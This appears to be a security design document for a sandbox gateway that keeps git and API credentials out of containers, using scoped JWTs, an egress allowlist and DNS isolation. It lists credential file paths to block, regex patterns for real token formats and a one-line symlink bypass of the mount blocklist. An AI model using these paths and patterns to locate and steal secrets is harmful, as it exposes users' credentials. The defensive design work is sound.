# Credential Isolation: Gateway Sidecar (No Credentials in Sandbox)

## Summary

Implement the gateway sidecar pattern for foundry-sandbox so **external credentials never enter sandbox containers**. All authenticated operations (git and API calls) go through a gateway service that holds credentials. Sandbox containers run on an internal-only network, and all outbound egress is forced through an allowlisted HTTP(S) proxy.

---

## Threat Model

### In Scope (Protected Against)

| Threat | Mitigation |
|--------|------------|
| Malicious code in sandbox reads `~/.ssh`, `~/.aws`, etc. | Dangerous path blocklist (Phase 1) |
| Sandbox exfiltrates credentials via env vars | Credentials never passed to sandbox container |
| Sandbox pushes to unauthorized repos | Per-session repo authorization via gateway |
| Sandbox exfiltrates data to arbitrary hosts | Egress proxy allowlist |
| Embedded tokens in git remotes | Preflight URL scanning + URL rewriting |
| DNS-based data exfiltration | Forced DNS resolution via gateway |
| Token theft from sandbox env/memory | Short-lived access tokens with automatic refresh |
| Git config bypass attacks | Gateway origin validation + network-level blocking |
| Symlink attacks to mount dangerous paths | Symlink resolution before validation |
| Brute force / abuse attacks | Per-session rate limiting |
| Network sniffing on internal network | TLS encryption by default |

### Out of Scope (Not Protected Against)

| Threat | Rationale |
|--------|-----------|
| Secrets hardcoded in workspace files (`.env`, `config.json`) | Workspace is user-provided; optional scanning available |
| Container escape / Docker vulnerabilities | Requires host-level hardening (gVisor, etc.) |
| Side-channel attacks | Out of scope for application-level isolation |
| Compromise of the gateway container itself | Assumes gateway runs in trusted context |

---

## Architecture Overview

```
┌─────────────────────────────┐     ┌─────────────────────────────┐     ┌─────────────────────────────┐
│  Sandbox Container          │     │  Gateway Service            │     │  Egress Proxy               │
│  (No external credentials)  │     │  (Holds external creds)     │     │  (Allowlisted outbound)     │
│                             │     │                             │     │                             │
│  git push/fetch ────────────┼────►│  Git Smart HTTP endpoint    │     │                             │
│  (https://gateway:8080)     │     │  pushes to upstream w/ token│     │                             │
│                             │     │  (per-session repo authz)   │     │                             │
│                             │     │                             │     │                             │
│  HTTP(S) traffic ───────────┼───────────────────────────────────┼────►│  HTTP(S) proxy allowlist    │
│  (via proxy:3128)           │     │                             │     │                             │
│                             │     │                             │     │                             │
│  DNS queries ───────────────┼────►│  DNS resolver (DoH/local)   │     │                             │
│  (gateway:53)               │     │  no external DNS leakage    │     │                             │
└─────────────────────────────┘     └─────────────────────────────┘     └─────────────────────────────┘
       sandbox_internal                 sandbox_internal + external            sandbox_internal + external
      (no external network)
```

Notes:
- The **gateway may be a container**; the requirement is that sandbox containers never see external tokens.
- The **egress proxy** can be a separate service or embedded in the gateway container.
- A **session-scoped gateway token** authorizes specific repos for this sandbox session (not a global token).
- **DNS is forced through the gateway** to prevent DNS-based exfiltration.
- **TLS is enabled by default** for internal network communication.

---

## Identified Security Issues and Mitigations

This section documents security issues identified during review and their mitigations.

### Issue 1: Token Accessible in Sandbox (HIGH PRIORITY)

**Problem:** `GATEWAY_TOKEN` is passed as an env var, readable via `env`, `/proc/*/environ`, or memory.

**Solution:** Implement short-lived access tokens (5 min) with automatic refresh via a longer-lived refresh token (24h). The access token is stored in a file with restricted permissions, and the credential helper automatically refreshes it when expired.

**Implementation:** See [Session Token Lifecycle](#session-token-lifecycle) section.

---

### Issue 2: Git Config Bypass (HIGH PRIORITY)

**Problem:** Users can bypass URL rewrites with `GIT_CONFIG_NOSYSTEM=1` or `-c` flags.

**Solution:** Gateway validates request origin (must be from internal network) and rejects direct external URLs. Additionally, block direct git ports at the network level.

**Implementation:** See [Phase 2: Gateway Service](#phase-2-gateway-service-git-smart-http--auth) for origin validation and [Phase 3: Docker Networking](#phase-3-docker-networking--egress-proxy--dns) for network-level blocking.

---

### Issue 3: NET_ADMIN Capability Risk (HIGH PRIORITY)

**Problem:** Original plan required `NET_ADMIN` for iptables inside sandbox, which allows removing the rules.

**Solution:** The sandbox already uses iptables without giving the sandbox container `NET_ADMIN`. The firewall runs on the *host* side or in a privileged setup container, not inside the sandbox. The `internal: true` Docker network setting provides sufficient isolation.

**Key Decision:** Do NOT add `NET_ADMIN` to sandbox containers. Remove iptables-in-sandbox approach from implementation.

---

### Issue 4: Symlink Bypass for Blocklist (HIGH PRIORITY)

**Problem:** `ln -s ~/.ssh /tmp/foo && sandbox new --mount /tmp/foo:/mnt` bypasses blocklist.

**Solution:** Resolve symlinks using `realpath` before validation. Check both directions: if mount path resolves to dangerous path, AND if dangerous path is under mount path.

**Implementation:** See [Phase 1: Dangerous Directory Blocklist](#phase-1-dangerous-directory-blocklist-foundation).

---

### Issue 5: No Rate Limiting (MEDIUM PRIORITY)

**Problem:** No protection against abuse or brute force attacks against the gateway.

**Solution:** Add per-session rate limiting (default: 100 requests/minute). Skip rate limiting for health check endpoints.

**Implementation:** See [Rate Limiting](#rate-limiting) section.

---

### Issue 6: HTTP on Internal Network (MEDIUM PRIORITY)

**Problem:** Original plan used unencrypted HTTP on internal network, vulnerable to sniffing.

**Solution:** Enable TLS by default with auto-generated certificates. An init container generates self-signed certs, and the sandbox trusts the gateway cert.

**Implementation:** See [TLS Configuration](#tls-configuration) section.

---

### Issue 7: No Audit Logging (MEDIUM PRIORITY)

**Problem:** No structured logging for security events and forensics.

**Solution:** Add structured JSON audit logging for all security-relevant events.

**Implementation:** See [Audit Logging](#audit-logging) section.

---

## Session Token Lifecycle

### Token Generation and Scoping

Each sandbox session receives unique tokens for authorization:

```
┌──────────────────┐      ┌──────────────────┐      ┌──────────────────┐
│  sandbox new     │      │  Gateway         │      │  Sandbox         │
│  --repo org/foo  │─────►│  /session/create │─────►│  REFRESH_TOKEN   │
│                  │      │                  │      │  (24h lifetime)  │
│                  │      │  Returns:        │      │                  │
│                  │      │  - session_id    │      │  credential-     │
│                  │      │  - access_token  │      │  helper gets     │
│                  │      │    (5 min)       │      │  access_token    │
│                  │      │  - refresh_token │      │  on demand       │
│                  │      │    (24h)         │      │                  │
│                  │      │  - allowed_repos │      │                  │
└──────────────────┘      └──────────────────┘      └──────────────────┘
```

### Token Structure (JWT)

**Access Token (short-lived):**
```json
{
  "sub": "session:abc123",
  "type": "access",
  "iat": 1706400000,
  "exp": 1706400300,
  "scope": {
    "repos": ["github.com/org/foo"],
    "actions": ["pull", "push"]
  }
}
```

**Refresh Token (longer-lived):**
```json
{
  "sub": "session:abc123",
  "type": "refresh",
  "iat": 1706400000,
  "exp": 1706486400
}
```

### Token Properties

| Property | Access Token | Refresh Token | Rationale |
|----------|--------------|---------------|-----------|
| Lifetime | 5 minutes | 24 hours | Limits exposure window |
| Purpose | Authorize requests | Get new access tokens | Separation of concerns |
| Scope | Explicit repo list | Session reference | Access token carries permissions |
| Storage | File (600 perms) | Env var | Access token rotates frequently |

### Session Manager Implementation

```python
# gateway/session_manager.py

class SessionManager:
    def create_session(self, repos: list[str], actions: list[str]) -> Session:
        """
        Called by host (not sandbox) when creating a new sandbox.

        Args:
            repos: List of repos this session can access ["github.com/org/repo"]
            actions: Allowed actions ["pull", "push"]

        Returns:
            Session with:
            - access_token: Short-lived (5 min), used for requests
            - refresh_token: Longer-lived (24h), used only to get new access tokens
        """
        session_id = self._generate_session_id()
        access_token = self._generate_jwt(session_id, repos, actions, ttl=300)  # 5 min
        refresh_token = self._generate_refresh_token(session_id, ttl=86400)  # 24h
        return Session(session_id, access_token, refresh_token, repos, actions)

    def refresh_access_token(self, refresh_token: str) -> str:
        """
        Called automatically by credential helper when access_token expires.

        Returns:
            New access token with same scope as original session
        """
        session = self._validate_refresh_token(refresh_token)
        if not session:
            raise InvalidTokenError("Invalid or expired refresh token")
        return self._generate_jwt(session.id, session.repos, session.actions, ttl=300)

    def validate_request(self, token: str, repo: str, action: str) -> bool:
        """
        Called on every git request from sandbox.

        Returns False if:
        - Token is expired
        - Token signature is invalid
        - Repo is not in token's scope
        - Action is not in token's scope
        """
        try:
            payload = jwt.decode(token, self.jwt_secret, algorithms=['HS256'])
            if payload.get('type') != 'access':
                return False
            if repo not in payload['scope']['repos']:
                return False
            if action not in payload['scope']['actions']:
                return False
            return True
        except jwt.ExpiredSignatureError:
            return False
        except jwt.InvalidTokenError:
            return False
```

### Credential Helper (Auto-Refresh)

```bash
# gateway/credential-helper.sh (installed in sandbox)
#!/bin/bash
# Called by git credential helper

ACCESS_TOKEN_FILE="/tmp/.gateway_access_token"
REFRESH_TOKEN="${GATEWAY_REFRESH_TOKEN}"

# Check if access token exists and is valid
if [[ -f "$ACCESS_TOKEN_FILE" ]]; then
    # JWT exp check (simplified)
    exp=$(cat "$ACCESS_TOKEN_FILE" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .exp)
    now=$(date +%s)
    if [[ $exp -gt $((now + 30)) ]]; then
        echo "password=$(cat $ACCESS_TOKEN_FILE)"
        exit 0
    fi
fi

# Refresh the token
new_token=$(curl -sf https://gateway:8080/session/refresh \
    -H "Authorization: Bearer $REFRESH_TOKEN" | jq -r .access_token)

if [[ -n "$new_token" && "$new_token" != "null" ]]; then
    echo "$new_token" > "$ACCESS_TOKEN_FILE"
    chmod 600 "$ACCESS_TOKEN_FILE"
    echo "password=$new_token"
else
    echo "Failed to refresh token" >&2
    exit 1
fi
```

### Token Validation Flow

```python
# gateway/auth.py
def validate_token(token: str, repo: str, action: str) -> bool:
    """
    1. Verify JWT signature
    2. Check expiration
    3. Verify token type is 'access'
    4. Verify repo is in scope.repos
    5. Verify action is in scope.actions
    """
```

---

## Implementation Phases

### Phase 1: Dangerous Directory Blocklist (Foundation)

**Goal:** Prevent mounting credential directories/files into any sandbox.

**Files to modify:**
- `lib/validate.sh` - Add `DANGEROUS_PATHS`, `validate_mount_path()`, and symlink resolution
- `commands/new.sh` - Call validation for each mount
- `lib/arg_parser.sh` - Add `--allow-dangerous-mount` flag

**Notes:**
- Treat both directories and files as dangerous.
- This list is **non-exhaustive** by design; allow user extension via env or config.
- **Critical:** Resolve symlinks before validation to prevent bypass attacks.

**Implementation:**
```bash
# lib/validate.sh
DANGEROUS_PATHS=(
    "$HOME/.ssh"
    "$HOME/.aws"
    "$HOME/.config/gcloud"
    "$HOME/.config/google-cloud"
    "$HOME/.config/gh"
    "$HOME/.azure"
    "$HOME/.config/azure"
    "$HOME/.netrc"
    "$HOME/.kube"
    "$HOME/.gnupg"
    "$HOME/.docker"
    "$HOME/.npmrc"
    "$HOME/.pypirc"
    "$HOME/.terraform.d"
)

# Optional: allow a user-supplied list, e.g. SANDBOX_DANGEROUS_PATHS

validate_mount_path() {
    local mount_path="$1"

    # Resolve symlinks to get canonical path
    local canonical_path
    canonical_path=$(realpath -m "$mount_path" 2>/dev/null) || canonical_path="$mount_path"

    # Also resolve $HOME in DANGEROUS_PATHS
    for dangerous in "${DANGEROUS_PATHS[@]}"; do
        local resolved_dangerous
        resolved_dangerous=$(realpath -m "$dangerous" 2>/dev/null) || resolved_dangerous="$dangerous"

        # Check if canonical path is under or equals dangerous path
        if [[ "$canonical_path" == "$resolved_dangerous" ]] || \
           [[ "$canonical_path" == "$resolved_dangerous"/* ]]; then
            error "Mount path '$mount_path' resolves to dangerous path '$resolved_dangerous'"
            return 1
        fi

        # Also check if dangerous path is under mount path (mounting parent of .ssh)
        if [[ "$resolved_dangerous" == "$canonical_path"/* ]]; then
            error "Mount path '$mount_path' contains dangerous path '$resolved_dangerous'"
            return 1
        fi
    done

    return 0
}
```

---

### Phase 2: Gateway Service (Git Smart HTTP + Auth)

**Goal:** Handle authenticated git operations and API calls without placing tokens in sandbox containers.

**Key design choice:** Git runs in the **gateway**, not the sandbox.

**New files to create:**
```
gateway/
├── Dockerfile.gateway
├── gateway.py              # HTTP server (health + auth + routing + DNS)
├── git_http_backend.py     # Git Smart HTTP handler (git http-backend)
├── session_manager.py      # Session creation, token generation, scope validation
├── auth.py                 # JWT token validation
├── rate_limiter.py         # Per-session rate limiting
├── audit.py                # Structured audit logging
├── log_sanitizer.py        # Scrub credentials from logs/errors
├── credential-helper.sh    # Auto-refresh credential helper for sandbox
├── requirements.txt
└── config.yaml             # Gateway configuration (credential mappings, defaults)
```

**Gateway behavior:**
- `/health` returns 200 OK (no auth required).
- `/ready` returns 200 OK when fully ready to serve (no auth required).
- `/metrics` returns Prometheus metrics (no auth required).
- `/session/create` creates a new session with scoped tokens (called by host, not sandbox).
- `/session/refresh` returns a new access token given a valid refresh token.
- `/git/<provider>/<owner>/<repo>.git/*` implements Git Smart HTTP using `git http-backend`.
- Gateway pushes to upstream using provider-specific credentials from its own env.
- All gateway endpoints (except `/health`, `/ready`, `/metrics`) require valid token.
- Session token is validated against the requested repo before any operation.
- **Origin validation:** Reject requests not from sandbox_internal network.

**Git HTTP Backend with Origin Validation:**

```python
# gateway/git_http_backend.py

ALLOWED_PROVIDERS = {
    'github': 'github.com',
    'gitlab': 'gitlab.com',
    'bitbucket': 'bitbucket.org',
}

def handle_git_request(request, provider: str, owner: str, repo: str):
    # Validate provider is in our allowlist
    if provider not in ALLOWED_PROVIDERS:
        audit.log_event('blocked_provider', session_id=None,
                       provider=provider, reason='unknown_provider')
        return Response("Unknown provider", status=400)

    # Validate the request came from internal network
    if not is_internal_request(request):
        audit.log_event('blocked_external', session_id=None,
                       client_ip=request.remote_addr, reason='external_request')
        return Response("External requests not allowed", status=403)

    # Validate token scope includes this repo
    token = extract_token(request)
    session_id = decode_session_id(token)
    full_repo = f"{ALLOWED_PROVIDERS[provider]}/{owner}/{repo}"

    if not session_manager.validate_request(token, full_repo, get_git_action(request)):
        audit.log_event('blocked_repo', session_id=session_id,
                       repo=full_repo, reason='not_in_scope')
        return Response("Repository not in session scope", status=403)

    # Proceed with git operation using gateway's credentials
    result = proxy_to_upstream(provider, owner, repo, request)
    audit.log_event('git_operation', session_id=session_id,
                   repo=full_repo, action=get_git_action(request), result='success')
    return result

def is_internal_request(request) -> bool:
    """Reject requests not from sandbox_internal network."""
    client_ip = request.remote_addr
    # Docker internal network is typically 172.x.x.x
    return client_ip.startswith('172.')
```

**Repo Authorization Model:**

```python
# gateway/session_manager.py

class SessionManager:
    def create_session(self, repos: list[str], actions: list[str]) -> Session:
        """
        Called by host (not sandbox) when creating a new sandbox.

        Args:
            repos: List of repos this session can access ["github.com/org/repo"]
            actions: Allowed actions ["pull", "push"]

        Returns:
            Session with unique ID, access token, and refresh token
        """

    def validate_request(self, token: str, repo: str, action: str) -> bool:
        """
        Called on every git request from sandbox.

        Returns False if:
        - Token is expired
        - Token signature is invalid
        - Repo is not in token's scope
        - Action is not in token's scope
        """
```

**Repo Registration Workflow:**

Repos are NOT pre-registered in a static file. Instead:

1. Host runs `sandbox new --repo github.com/org/foo`
2. Host calls gateway `/session/create` with `repos=["github.com/org/foo"]`
3. Gateway returns session with access token and refresh token
4. Refresh token is passed to sandbox as `GATEWAY_REFRESH_TOKEN`
5. Credential helper auto-refreshes access tokens as needed
6. Sandbox can only access `github.com/org/foo` via this token

This means:
- No static `repos.json` allowlist needed
- Sandbox cannot request access to additional repos
- Each session is isolated to its declared repos
- Token theft is limited to 5-minute window

**Log Sanitization:**

```python
# gateway/log_sanitizer.py

SENSITIVE_PATTERNS = [
    r'ghp_[a-zA-Z0-9]{36}',           # GitHub PAT
    r'gho_[a-zA-Z0-9]{36}',           # GitHub OAuth
    r'github_pat_[a-zA-Z0-9_]{82}',   # GitHub fine-grained PAT
    r'glpat-[a-zA-Z0-9\-]{20}',       # GitLab PAT
    r'sk-[a-zA-Z0-9]{48}',            # OpenAI API key
    r'Bearer\s+[a-zA-Z0-9\-_\.]+',    # Generic bearer tokens
]

def sanitize(text: str) -> str:
    """Replace all sensitive patterns with [REDACTED]"""
```

All gateway logs and error responses pass through sanitization.

**Why Git Smart HTTP:**
- Avoids sharing the workspace volume.
- Eliminates `repo_path` from untrusted user input.
- Works with standard `git push` from the sandbox against the gateway URL.

---

### Rate Limiting

**Goal:** Protect gateway from abuse and brute force attacks.

```python
# gateway/rate_limiter.py

from collections import defaultdict
from time import time

class RateLimiter:
    def __init__(self, requests_per_minute: int = 100):
        self.rpm = requests_per_minute
        self.requests = defaultdict(list)  # session_id -> [timestamps]

    def is_allowed(self, session_id: str) -> bool:
        now = time()
        window_start = now - 60

        # Clean old entries
        self.requests[session_id] = [
            ts for ts in self.requests[session_id] if ts > window_start
        ]

        if len(self.requests[session_id]) >= self.rpm:
            return False

        self.requests[session_id].append(now)
        return True
```

```python
# gateway/gateway.py
@app.before_request
def check_rate_limit():
    if request.path in ['/health', '/ready', '/metrics']:
        return  # Skip rate limiting for health checks

    token = extract_token(request)
    if token:
        session_id = decode_session_id(token)
        if not rate_limiter.is_allowed(session_id):
            audit.log_event('rate_limited', session_id=session_id,
                           path=request.path)
            return jsonify({'error': 'Rate limit exceeded'}), 429
```

---

### Audit Logging

**Goal:** Provide structured JSON audit logs for security events and forensics.

```python
# gateway/audit.py

import json
import logging
from datetime import datetime

audit_logger = logging.getLogger('audit')
audit_handler = logging.FileHandler('/var/log/gateway/audit.jsonl')
audit_handler.setFormatter(logging.Formatter('%(message)s'))
audit_logger.addHandler(audit_handler)
audit_logger.setLevel(logging.INFO)

def log_event(event_type: str, session_id: str, **kwargs):
    event = {
        'timestamp': datetime.utcnow().isoformat(),
        'event_type': event_type,
        'session_id': session_id,
        **kwargs
    }
    audit_logger.info(json.dumps(event))
```

**Event types to log:**

| Event Type | Description | Additional Fields |
|------------|-------------|-------------------|
| `session_created` | New session with repo scope | repos, actions |
| `session_refreshed` | Token refresh | - |
| `git_operation` | Clone/push/fetch | repo, action, result |
| `auth_failed` | Invalid/expired token attempts | reason |
| `rate_limited` | Rate limit hits | path |
| `blocked_repo` | Attempt to access unauthorized repo | repo, reason |
| `blocked_external` | External request rejected | client_ip |
| `blocked_provider` | Unknown provider | provider |

---

### TLS Configuration

**Goal:** Encrypt internal network communication by default.

```yaml
# docker-compose.yml
services:
  gateway:
    environment:
      - GATEWAY_TLS_ENABLED=true
      - GATEWAY_TLS_CERT=/certs/gateway.crt
      - GATEWAY_TLS_KEY=/certs/gateway.key
    volumes:
      - gateway-certs:/certs:ro
    depends_on:
      gateway-init:
        condition: service_completed_successfully

  # Init container generates certs
  gateway-init:
    image: alpine/openssl
    command: |
      sh -c "
        if [ ! -f /certs/gateway.crt ]; then
          openssl req -x509 -newkey rsa:2048 -keyout /certs/gateway.key \
            -out /certs/gateway.crt -days 365 -nodes \
            -subj '/CN=gateway' -addext 'subjectAltName=DNS:gateway'
        fi
      "
    volumes:
      - gateway-certs:/certs

volumes:
  gateway-certs:
```

```python
# gateway/gateway.py - TLS support
import ssl

def run_server():
    if os.environ.get('GATEWAY_TLS_ENABLED') == 'true':
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(
            os.environ['GATEWAY_TLS_CERT'],
            os.environ['GATEWAY_TLS_KEY']
        )
        app.run(host='0.0.0.0', port=8080, ssl_context=context)
    else:
        app.run(host='0.0.0.0', port=8080)
```

```dockerfile
# Dockerfile - Trust gateway cert
COPY --from=gateway-init /certs/gateway.crt /usr/local/share/ca-certificates/gateway.crt
RUN update-ca-certificates
```

---

### Phase 3: Docker Networking + Egress Proxy + DNS

**Goal:** Sandbox has no direct external egress; all outbound traffic uses a proxy with an allowlist. DNS queries are resolved by the gateway to prevent DNS exfiltration.

**Important:** Network isolation is achieved via Docker's `internal: true` network setting. Do NOT use iptables inside the sandbox (requires NET_ADMIN capability which would allow removing the rules).

**Files to modify:**
- `docker-compose.yml` - Add gateway + egress-proxy services and internal network
- `commands/new.sh` - Ensure env vars and flags are wired
- `gateway/dnsmasq.conf` - DNS resolver configuration
- `safety/network-firewall.sh` - Block direct git host access (runs on host, not in sandbox)

**docker-compose.yml:**
```yaml
networks:
  sandbox_internal:
    driver: bridge
    internal: true   # No external connectivity - THIS IS THE KEY ISOLATION
  sandbox_external:
    driver: bridge

services:
  gateway:
    build:
      context: ./gateway
      dockerfile: Dockerfile.gateway
    environment:
      # Provider credentials (never exposed to sandbox)
      - GH_TOKEN
      - GITLAB_TOKEN
      - BITBUCKET_TOKEN
      - CLAUDE_CODE_OAUTH_TOKEN
      - OPENAI_API_KEY
      # Gateway signing key for JWTs
      - GATEWAY_JWT_SECRET
      # TLS configuration
      - GATEWAY_TLS_ENABLED=true
      - GATEWAY_TLS_CERT=/certs/gateway.crt
      - GATEWAY_TLS_KEY=/certs/gateway.key
    volumes:
      - gateway-certs:/certs:ro
    networks:
      - sandbox_internal
      - sandbox_external
    # Expose DNS on internal network
    ports:
      - "53:53/udp"
    cap_add:
      - NET_BIND_SERVICE
    depends_on:
      gateway-init:
        condition: service_completed_successfully

  gateway-init:
    image: alpine/openssl
    command: |
      sh -c "
        if [ ! -f /certs/gateway.crt ]; then
          openssl req -x509 -newkey rsa:2048 -keyout /certs/gateway.key \
            -out /certs/gateway.crt -days 365 -nodes \
            -subj '/CN=gateway' -addext 'subjectAltName=DNS:gateway'
        fi
      "
    volumes:
      - gateway-certs:/certs

  egress-proxy:
    image: tinyproxy:latest  # Lighter than Squid for allowlist-only
    volumes:
      - ./gateway/tinyproxy.conf:/etc/tinyproxy/tinyproxy.conf:ro
    networks:
      - sandbox_internal
      - sandbox_external

  dev:
    environment:
      - HTTP_PROXY=http://egress-proxy:8888
      - HTTPS_PROXY=http://egress-proxy:8888
      - NO_PROXY=localhost,127.0.0.1,gateway,egress-proxy
      - GIT_GATEWAY_URL=https://gateway:8080
      - GATEWAY_REFRESH_TOKEN=${GATEWAY_REFRESH_TOKEN}
    dns:
      - gateway  # Force all DNS through gateway
    networks:
      - sandbox_internal  # ONLY internal network - NO cap_add for NET_ADMIN
    depends_on:
      - gateway
      - egress-proxy

volumes:
  gateway-certs:
```

**Network-Level Git Blocking (Host-Side):**

Block direct git access to force all git traffic through the gateway. This runs on the host or in a privileged setup container, NOT inside the sandbox.

```bash
# safety/network-firewall.sh (addition to existing)

block_external_git() {
    # Block direct SSH to git hosts (force through gateway)
    iptables -A OUTPUT -p tcp --dport 22 -d github.com -j REJECT
    iptables -A OUTPUT -p tcp --dport 22 -d gitlab.com -j REJECT
    iptables -A OUTPUT -p tcp --dport 22 -d bitbucket.org -j REJECT

    # Block direct HTTPS to git hosts (force through gateway)
    # Only allow gateway to reach these
    iptables -A OUTPUT -p tcp --dport 443 -d github.com -j REJECT
    iptables -A OUTPUT -p tcp --dport 443 -d gitlab.com -j REJECT
    iptables -A OUTPUT -p tcp --dport 443 -d bitbucket.org -j REJECT
}
```

**DNS Isolation:**

The gateway runs a local DNS resolver (dnsmasq) that:
1. Resolves allowlisted domains via upstream DNS
2. Returns NXDOMAIN for non-allowlisted domains
3. Logs all DNS queries for audit

```
# gateway/dnsmasq.conf
# Only resolve allowlisted domains
server=/github.com/8.8.8.8
server=/api.anthropic.com/8.8.8.8
server=/api.openai.com/8.8.8.8
server=/pypi.org/8.8.8.8
server=/npmjs.org/8.8.8.8

# Block everything else (return NXDOMAIN)
address=/#/
```

**Allowlist Integration:**

The plan should reference the existing `ALLOWED_DOMAINS` from `safety/network-firewall.sh` rather than maintaining a separate list. Single source of truth.

```bash
# lib/network.sh - Export allowlist for gateway config generation

generate_proxy_allowlist() {
    # Source existing allowlist
    source "$(dirname "$0")/../safety/network-firewall.sh"

    # Generate tinyproxy config
    for domain in "${ALLOWED_DOMAINS[@]}"; do
        echo "Allow $domain"
    done
}
```

```bash
# gateway/egress_allowlist.txt (derived from existing network-firewall.sh)

# Package registries
registry.npmjs.org
pypi.org
files.pythonhosted.org
proxy.golang.org
sum.golang.org
crates.io
static.crates.io
index.crates.io

# AI APIs
api.anthropic.com
api.openai.com

# GitHub (non-git operations like API, releases)
api.github.com
raw.githubusercontent.com
github.com
```

**Proxy Choice: tinyproxy vs Squid:**

| Feature | tinyproxy | Squid |
|---------|-----------|-------|
| Memory footprint | ~2MB | ~50MB+ |
| Configuration complexity | Simple | Complex |
| HTTPS CONNECT | Yes | Yes |
| Allowlist filtering | Yes | Yes |
| Caching | No | Yes |

Recommendation: Use tinyproxy for sandbox use case (no caching needed, simpler config).

---

### Phase 4: Git URL Rewrite + Remote Sanitization

**Goal:** Ensure git in the sandbox always targets the gateway and never embeds tokens.

**Git Config in Docker Image (Not Entrypoint):**

To avoid race conditions, bake the git URL rewrite into the Docker image:

```dockerfile
# Dockerfile (sandbox image)

# Install credential helper
COPY gateway/credential-helper.sh /usr/local/bin/git-credential-gateway
RUN chmod +x /usr/local/bin/git-credential-gateway

# Create global gitconfig with URL rewrites
RUN cat > /etc/gitconfig <<'EOF'
[url "https://gateway:8080/git/github/"]
    insteadOf = https://github.com/
    insteadOf = git@github.com:
    insteadOf = ssh://git@github.com/
[url "https://gateway:8080/git/gitlab/"]
    insteadOf = https://gitlab.com/
    insteadOf = git@gitlab.com:
[url "https://gateway:8080/git/bitbucket/"]
    insteadOf = https://bitbucket.org/
    insteadOf = git@bitbucket.org:
[credential]
    helper = gateway
EOF

# Trust gateway cert
COPY --from=gateway-init /certs/gateway.crt /usr/local/share/ca-certificates/gateway.crt
RUN update-ca-certificates
```

This ensures git URL rewriting is active before any user code runs.

**Embedded Token Detection:**

Scan workspace `.git/config` and reject sandboxes with embedded credentials:

```bash
# lib/validate.sh

# Patterns for embedded tokens in git URLs
EMBEDDED_TOKEN_PATTERNS=(
    # GitHub tokens
    'ghp_[a-zA-Z0-9]{36}'
    'gho_[a-zA-Z0-9]{36}'
    'ghu_[a-zA-Z0-9]{36}'
    'ghs_[a-zA-Z0-9]{36}'
    'ghr_[a-zA-Z0-9]{36}'
    'github_pat_[a-zA-Z0-9_]{82}'
    # GitLab tokens
    'glpat-[a-zA-Z0-9\-_]{20}'
    # Bitbucket tokens
    'ATBB[a-zA-Z0-9]{32}'
    # Generic patterns (user:token@host)
    '://[^:]+:[^@]{20,}@'
    # x-access-token pattern
    'x-access-token:[^@]+@'
    # x-oauth-basic pattern
    '[^:]+:x-oauth-basic@'
)

validate_git_remotes() {
    local workspace="$1"
    local git_config="${workspace}/.git/config"

    if [[ ! -f "$git_config" ]]; then
        return 0  # No git repo, nothing to check
    fi

    for pattern in "${EMBEDDED_TOKEN_PATTERNS[@]}"; do
        if grep -qE "$pattern" "$git_config"; then
            error "Embedded credential detected in git remote"
            error "Please remove tokens from .git/config before creating sandbox"
            error "Pattern matched: $pattern"
            return 1
        fi
    done

    # Also check for plaintext credentials in URL
    local remotes
    remotes=$(git -C "$workspace" remote -v 2>/dev/null || true)
    for pattern in "${EMBEDDED_TOKEN_PATTERNS[@]}"; do
        if echo "$remotes" | grep -qE "$pattern"; then
            error "Embedded credential detected in git remote URL"
            return 1
        fi
    done

    return 0
}
```

**Entrypoint Verification:**

Even with baked-in config, verify at runtime:

```bash
# entrypoint.sh (verification, not configuration)

verify_git_config() {
    # Ensure URL rewrites are active
    local github_url
    github_url=$(git config --get-urlmatch url.insteadOf https://github.com/ 2>/dev/null || true)

    if [[ -z "$github_url" || "$github_url" != *"gateway"* ]]; then
        echo "ERROR: Git URL rewrite not configured correctly" >&2
        echo "Expected gateway URL, got: $github_url" >&2
        exit 1
    fi

    # Ensure no credential helpers that might leak tokens
    git config --global --unset-all credential.helper 2>/dev/null || true

    # Set our credential helper that uses auto-refresh
    git config --global credential.helper gateway
}

verify_git_config
```

---

### Phase 5: Failure Modes and Recovery

**Goal:** Handle gateway/proxy unavailability gracefully.

**Gateway Health Check:**

```python
# gateway/gateway.py

@app.route('/health')
def health():
    """
    Health check endpoint (no auth required).
    Returns component status for orchestration.
    """
    return jsonify({
        'status': 'healthy',
        'components': {
            'git_backend': check_git_backend(),
            'dns_resolver': check_dns(),
            'upstream_connectivity': check_upstream(),
        },
        'version': VERSION,
    })

@app.route('/ready')
def ready():
    """
    Readiness check - only return 200 when fully ready to serve.
    """
    if not all([check_git_backend(), check_dns()]):
        return jsonify({'ready': False}), 503
    return jsonify({'ready': True})
```

**Sandbox Startup Retry:**

```bash
# entrypoint.sh

wait_for_gateway() {
    local max_attempts=30
    local attempt=1

    echo "Waiting for gateway to be ready..."

    while [[ $attempt -le $max_attempts ]]; do
        if curl -sf https://gateway:8080/ready > /dev/null 2>&1; then
            echo "Gateway is ready"
            return 0
        fi
        echo "Gateway not ready (attempt $attempt/$max_attempts)"
        sleep 1
        ((attempt++))
    done

    echo "ERROR: Gateway failed to become ready" >&2
    return 1
}

wait_for_gateway || exit 1
```

**Git Operation Retry:**

```bash
# lib/git_helpers.sh (sourced in sandbox)

git_with_retry() {
    local max_attempts=3
    local attempt=1

    while [[ $attempt -le $max_attempts ]]; do
        if git "$@"; then
            return 0
        fi

        local exit_code=$?

        # Check if gateway is down
        if ! curl -sf https://gateway:8080/health > /dev/null 2>&1; then
            echo "Gateway unavailable, waiting..." >&2
            sleep 5
        else
            # Gateway is up, this is a real git error
            return $exit_code
        fi

        ((attempt++))
    done

    echo "Git operation failed after $max_attempts attempts" >&2
    return 1
}

# Alias git to use retry wrapper
alias git='git_with_retry'
```

**Failure Scenarios:**

| Scenario | Behavior | User Impact |
|----------|----------|-------------|
| Gateway crashes mid-operation | Git command fails, retry on next attempt | Brief interruption |
| Gateway fails to start | Sandbox entrypoint exits with error | Sandbox won't start |
| Proxy unavailable | HTTP requests fail, sandbox can still use gateway | No external HTTP |
| DNS unavailable | All network operations fail | Sandbox isolated |
| Access token expired | Credential helper auto-refreshes | Transparent to user |
| Refresh token expired | 401 on refresh, git operations fail | Re-create sandbox |

**Monitoring and Alerting:**

The gateway exposes Prometheus metrics at `/metrics`:

```
# Gateway metrics
gateway_requests_total{endpoint="/git",status="200"} 42
gateway_requests_total{endpoint="/git",status="401"} 3
gateway_requests_total{endpoint="/git",status="429"} 5
gateway_git_operations_total{operation="push",repo="org/foo"} 10
gateway_token_validations_total{result="valid"} 50
gateway_token_validations_total{result="expired"} 2
gateway_token_validations_total{result="invalid_scope"} 1
